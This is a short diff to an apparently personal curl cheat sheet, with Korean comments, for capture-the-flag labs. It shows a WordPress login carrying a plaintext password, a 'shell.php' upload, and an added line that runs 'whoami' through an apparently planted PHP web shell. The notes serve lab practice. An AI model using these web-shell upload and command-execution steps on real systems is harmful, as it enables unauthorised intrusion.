@@ -53,6 +53,8 @@ curl -X POST -d "user=admin&pass=secret" http://target.com/login.php
 # login
 curl -i -X POST "http://www.smol.thm/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" -H "User-Agent: Mozilla/5.0" --data "log=wpuser&pwd=kbLSF2Vop%23lw3rjDZ629*Z%25G&rememberme=forever&wp-submit=Log+In&redirect_to=http://www.smol.thm/wp-admin/" -c cookie.txt
 
+# -G는 curl에서 --data/--data-urlencode로 보낼 데이터를 POST 본문이 아니라 URL 쿼리스트링(?cmd=...)으로 붙여 GET 요청으로 보내게 하는 옵션
+curl -G "http://monster.pg/blog/public/themes/default/zpsyc.chunk.php" --data-urlencode "cmd=whoami"
 
 # 파일 업로드
 curl -F "file=@shell.php" -F "description=profile" http://target.com/upload.php
